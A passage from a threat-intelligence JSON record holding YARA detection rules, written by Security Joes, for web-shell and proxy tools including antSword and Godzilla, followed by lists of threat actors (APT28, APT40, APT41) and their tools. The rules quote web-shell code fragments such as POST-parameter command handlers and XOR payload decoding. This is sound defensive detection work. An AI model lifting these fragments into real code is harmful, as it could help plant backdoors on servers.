ac e6 8d a2}\n  condition:\n    all of them\n}\n\n```\n```\nrule any_proxy {\n  meta:\n    author = \"Charles Lomboni - Security Joes\"\n    description = \"Rules to detect Any-Proxy tool\"\n    date = \"June, 2022\"\n    reference = \"https://github.com/yitd/Any-Proxy\"\n  strings:\n    $anyproxy_post = \"$_POST['Any-Proxy'], time()+3600*24*366);\"\n    $anyproxy_anyip_comment = {2f 2f 24 61 6e 79 69 70 e5 80 bc e4 b8 ba 31 e5 8f 91 e9 80 81 e6 9c\n    8d e5 8a a1 e5 99 a8 49 50 e5 a4 b4 ef bc 8c e5 80 bc e4 b8 ba 32 e5 88 99 e5 8f 91 e9 80 81 e9\n    9a 8f e6 9c ba 49 50 ef bc 8c e5 80 bc e4 b8 ba 33 e5 8f 91 e9 80 81 e5 ae a2 e6 88 b7 e7 ab af\n    49 50 ef bc 8c e4 bb 85 e5 9c a8 e9 83 a8 e5 88 86 e7 bd 91 e7 ab 99 e4 b8 ad e6 9c 89 e6 95\n    88}\n    $anyproxy_html = {e5 9c a8 e5 bd 93 e5 89 8d e9 93 be e6 8e a5 e6 9c ab e5 b0 be e8 be 93 e5 85\n    a5 20 7e 71 20 e5 8f af e4 bb a5 e9 80 80 e5 87 ba e5 bd 93 e5 89 8d e9 a1 b5 e9 9d a2 e5 9b 9e\n    e5 88 b0 e9 a6 96 e9 a1 b5 3c 2f 70 3e 3c 70 3e e5 9c a8 e5 9f 9f e5 90 8d e5 90 8e e9 9d a2 e5\n    8a a0 e4 b8 8a e9 93 be e6 8e a5 e5 9c b0 e5 9d 80 e5 8d b3 e5 8f af e8 ae bf e9 97 ae ef bc 8c\n    e5 a6 82 20 27 20 2e 20 24 68 74 74 70 73 20 2e 20 24 68 6f 73 74 20 2e 20 27 2f 68 74 74 70 3a\n    2f 2f 69 70 33 38 2e 63 6f 6d 2f}\n    $anyproxy_powered = \">©Powered by <a href=\\\"https://github.com/yitd/Any-Proxy\\\">Any-Proxy\"\n    $anyproxy_script_alert_ip = {3c 73 63 72 69 70 74 3e 61 6c 65 72 74 28 27 e8 af b7 e6 b1 82 e7\n    9a 84 69 70 e8 a2 ab e7 a6 81 e6 ad a2 ef bc 81 27 29}\n    $anyproxy_script_alert = {3c 73 63 72 69 70 74 3e 61 6c 65 72 74 28 27 e8 af b7 e6 b1 82 e7 9a\n    84 e5 9f 9f e5 90 8d e6 9c 89 e8 af af ef bc 81 27 29}\n    $anyproxy_array_comment = {2f 2f e5 85 b3 e7 b3 bb e6 95 b0 e7 bb 84 e8 bd ac e6 8d a2 e6 88 90\n    e5 ad 97 e7 ac a6 e4 b8 b2 ef bc 8c e6 af 8f e4 b8 aa e9 94 ae e5 80 bc e5 af b9 e4 b8 ad e9 97\n    b4 e7 94 a8 3d e8 bf 9e e6 8e a5 ef bc 8c e4 bb a5 3b 20 e5 88 86 e5 89 b2}\n    $anyproxy_foreach_comment = {2f 2f e5 a6 82 e6 9e 9c e8 bf 94 e5 9b 9e e5 88 b0 e5 ae a2 e6 88\n    b7 e7 ab af 63 6f 6f 6b 69 65 e4 b8 8d e6 ad a3 e5 b8 b8 e5 8f af e6 8a 8a e4 b8 8b e8 a1 8c e4\n    b8 ad e7 9a 84 24 72 6f 6f 74 20 2e 20 24 74 6f 70 e6 8d a2 e6 88 90 24 68 6f 73 74}\n  condition:\n    all of them\n}\nrule simple_php_proxy {\n  meta:\n    author = \"Charles Lomboni - Security Joes\"\n    description = \"Rules to detect Simple PHP Proxy tool\"\n    date = \"June, 2022\"\n    reference = \"https://github.com/cowboy/php-simple-proxy/\"\n  strings:\n    $simple_php_proxy_git_osc = \"git@osc\"\n    $simple_php_proxy_git_osc_url = \"http://git.oschina.net/atwal/php-simple-proxy\"\n    $simple_php_proxy_comments = {e4 bc 98 e5 8c 96 e4 bf ae e6 94 b9 e7 82 b9 ef bc 9a e5 8a a0 e4\nb8 8a e4 ba 86 e5 bc 82 e5 b8 b8 e5 a4 84 e7 90 86 ef bc 8c 62 61 73 65 75 72 6c e8 ae be e7 bd ae ef\nbc 8c e4 bc 9a e6 9b b4 e5 ae 89 e5 85 a8 ef bc 8c e9 bb 98 e8 ae a4 e4 b8 ba 6a 73 6f 6e 70 e6 a0 bc\ne5 bc 8f}\n    $simple_php_proxy_request_ex = \"simple_proxy.php?url=http://example.com/\"\n    $simple_php_proxy_github = \"http://github.com/cowboy/php-simple-proxy\"\n    $simple_php_proxy_config_comments = {e6 a0 b9 e6 8d ae e9 9c 80 e8 a6 81 e4 bf ae e6 94 b9 e4\nb8 8b e9 9d a2 e7 9a 84 e9 85 8d e7 bd ae e9 a1 b9 ef bc 8c e9 85 8d e7 bd ae e9 a1 b9 e8 af b4 e6 98\n8e e8 a7 81 e4 b8 8a e9 9d a2 e7 9a 84 e8 af b4 e6 98 8e e6 96 87 e5 ad 97}\n  condition:\n    all of them\n}\nrule goAgent_proxy {\n  meta:\n\n```\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n```\n    author = \"Charles Lomboni - Security Joes\"\n    description = \"Rules to detect goAgent proxy tool\"\n    date = \"June, 2022\"\n    reference = \"https://github.com/bclswl0827/goagent-php\"\n  strings:\n    $goagent_default_passwd = \"$__password__ =\"\n    $gogent_hostdeny = \"$__hostsdeny__ = array(); // $__hostsdeny__ = array('.youtube.com',\n'.youku.com');\"\n    $goagent_html_line = \"<tr><td bgcolor=#3366cc><font face=arial,sans-serif\ncolor=#ffffff><b>Error</b></td></tr>\"\n    $goagent_banner = \"<H1>${banner}</H1>\"\n    $goagent_password_isset = \"if (!isset($kwargs['password']) || $password != $kwargs['password'])\n{\"\n    $goagent_default_msg_error = \"message_html('502 Urlfetch Error',\"\n  condition:\n    all of them\n}\n\n```\n```\nrule antSword_webshell {\n  meta:\n    author = \"Charles Lomboni - Security Joes\"\n    description = \"Rules to detect antSword web shell\"\n    date = \"June, 2022\"\n    reference = \"https://github.com/AntSwordProject/antSword\"\n  strings:\n    $antSword_cmd = \"$cmd = @$_POST['ant'];\"\n    $antSword_pk = \"$pk = <<<EOF\"\n    $antSword_rsa_begin = \"-----BEGIN PUBLIC KEY-----\"\n    $antSword_rsa_end = \"-----END PUBLIC KEY-----\"\n  condition:\n    all of them\n}\n\n```\n```\nrule godzilla_webshell {\n  meta:\n    author = \"Charles Lomboni - Security Joes\"\n    description = \"Rules to detect Godzilla web shell\"\n    date = \"June, 2022\"\n    reference = \"https://github.com/BeichenDream/Godzilla\"\n  strings:\n    $godzilla_windows_temp = \"c:/windows/temp/\"\n    $godzilla_linux_temp = \"/tmp/\"\n    $godzilla_php_payload_notation = \"@PayloadAnnotation(Name = \\\"PhpDynamicPayload\\\")\"\n    $godzilla_php_regex =\n\"(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|canCallGzipDecode|canCallGzipEncode|systempdir)\"\n    $godzilla_php_get_payload = \"assets/payload.php\"\n    $godzilla_php_file_get = \"$data=file_get_contents(\\\"php://input\\\");\"\n    $godzilla_php_xor = \"$D[$i] = $D[$i]^$c;\"\n    $godzilla_java_payload_notation = \"@PayloadAnnotation(Name = \\\"JavaDynamicPayload\\\")\"\n    $godzilla_java_regex = \"FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory\"\n    $godzilla_java_erro_log = {e7 b1 bb 3a 20 25 73 20 e6 98 a0 e5 b0 84 e4 b8 8d e5 ad 98 e5 9c\n    a8}\n    $godzilla_java_get_payload = \"assets/payload.classs\"\n    $godzilla_java_dynamicClass = \"DynamicClassNames\"\n    $godzilla_java_appsettings = {4a 61 76 61 e5 8a a8 e6 80 81 43 6c 61 73 73 e5 90 8d e5 ad 97}\n    $godzilla_java_msg_dialog = {43 6c 61 73 73 4e 61 6d 65 20 e5 b0 91 e4 ba 8e 35 30 e4 b8 aa}  \n    $godzilla_csharp_payload_notation = \"@PayloadAnnotation(Name = \\\"CShapDynamicPayload\\\")\"\n    $godzilla_csharp_regex = \"FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory\"\n    $godzilla_csharp_get_payload = \"assets/payload.dll\"\n    $godzilla_asp_payload_notation = \"@PayloadAnnotation(Name = \\\"AspDynamicPayload\\\")\"\n    $godzilla_asp_regex = \"FileRoot|CurrentDir|OsInfo|CurrentUser\"\n    $godzilla_asp_get_payload = \"assets/payload.asp\"\n  condition:\n\n```\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n```\n    ($godzilla_php_payload_notation and $godzilla_php_regex and $godzilla_php_get_payload)\n    or ($godzilla_php_file_get and $godzilla_php_xor)\n    or ($godzilla_java_payload_notation and $godzilla_java_regex and $godzilla_java_erro_log and\n    $godzilla_java_get_payload and $godzilla_java_dynamicClass and $godzilla_java_appsettings and\n    $godzilla_java_msg_dialog)\n    or ($godzilla_csharp_payload_notation and $godzilla_csharp_regex and\n    $godzilla_csharp_get_payload)\n    or ($godzilla_asp_payload_notation and $godzilla_asp_regex and $godzilla_asp_get_payload)\n    and ($godzilla_windows_temp or $godzilla_linux_temp)\n}\n\n```\nThreat Intelligence & Incident Response Team\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://secjoes-reports.s3.eu-central-1.amazonaws.com/Backdoor%2Bvia%2BXFF%2BMysterious%2BThreat%2BActor%2BUnder%2BRadar.pdf"
    ],
    "report_names": [
        "Backdoor%2Bvia%2BXFF%2BMysterious%2BThreat%2BActor%2BUnder%2BRadar.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "59be3740-c8c7-47aa-84c8-e80d0cb7ea3a",
            "created_at": "2022-10-25T15:50:23.481057Z",
            "updated_at": "2025-03-27T02:00:55.480695Z",
            "deleted_at": null,
            "main_name": "Leviathan",
            "aliases": [
                "MUDCARP",
                "Kryptonite Panda",
                "Gadolinium",
                "BRONZE MOHAWK",
                "TEMP.Jumper",
                "APT40",
                "TEMP.Periscope",
                "Gingham Typhoon"
            ],
            "source_name": "MITRE:Leviathan",
            "tools": [
                "Windows Credential Editor",
                "BITSAdmin",
                "HOMEFRY",
                "Derusbi",
                "at",
                "BLACKCOFFEE",
                "BADFLICK",
                "gh0st RAT",
                "PowerSploit",
                "MURKYTOP",
                "NanHaiShu",
                "Orz",
                "Cobalt Strike",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b9806584-4d82-4f32-ae97-18a2583e8d11",
            "created_at": "2022-10-25T16:07:23.787833Z",
            "updated_at": "2025-03-27T02:02:09.978883Z",
            "deleted_at": null,
            "main_name": "Leviathan",
            "aliases": [
                "APT 40",
                "ATK 29",
                "Bronze Mohawk",
                "Gadolinium",
                "Gingham Typhoon",
                "ISLANDDREAMS",
                "ITG09",
                "Kryptonite Panda",
                "Mudcarp",
                "Red Ladon",
                "TA423",
                "TEMP.Jumper",
                "TEMP.Periscope"
            ],
            "source_name": "ETDA:Leviathan",
            "tools": [
                "AIRBREAK",
                "Agent.dhwf",
                "Agentemis",
                "AngryRebel",
                "BADFLICK",
                "BlackCoffee",
                "CHINACHOPPER",
                "China Chopper",
                "Cobalt Strike",
                "CobaltStrike",
                "DADJOKE",
                "Dadstache",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "Farfli",
                "GRILLMARK",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEFRY",
                "Hellsing Backdoor",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "LUNCHMONEY",
                "Living off the Land",
                "MURKYTOP",
                "Moudour",
                "Mydoor",
                "NanHaiShu",
                "Orz",
                "PCRat",
                "PNGRAT",
                "PlugX",
                "RedDelta",
                "SeDLL",
                "Sensocode",
                "SinoChopper",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Xamtrav",
                "ZXShell",
                "ZoxPNG",
                "cobeacon",
                "gresim",
                "scanbox"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "83025f5e-302e-46b0-baf6-650a4d313dfc",
            "created_at": "2024-05-01T02:03:07.971863Z",
            "updated_at": "2025-03-27T02:05:17.278721Z",
            "deleted_at": null,
            "main_name": "BRONZE MOHAWK",
            "aliases": [
                "Flaccid Rose ",
                "GADOLINIUM ",
                "Kryptonite Panda ",
                "Leviathan ",
                "Nanhaishu ",
                "Pickleworm ",
                "Temp.Jumper ",
                "Temp.Periscope ",
                "APT40 "
            ],
            "source_name": "Secureworks:BRONZE MOHAWK",
            "tools": [
                " BlackCoffee",
                " China Chopper",
                " Cobalt Strike",
                " Derusbi",
                " Derusbi Trojan",
                " FUSIONBLAZE",
                " GreenCrash",
                " HOMEFRY",
                " MURKYTOP",
                " Metasploit",
                " Metasploit / Meterpreter",
                " Nanhaishu",
                " Orz",
                " ScanBox",
                " SeDll",
                "AIRBREAK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041836,
    "ts_creation_date": 1655225849,
    "ts_modification_date": 1655225849,
    "files": {
        "pdf": "https://archive.orkl.eu/b67647c91154f8726891049665ec8cc293793b72.pdf",
        "text": "https://archive.orkl.eu/b67647c91154f8726891049665ec8cc293793b72.txt",
        "img": "https://archive.orkl.eu/b67647c91154f8726891049665ec8cc293793b72.jpg"
    }
}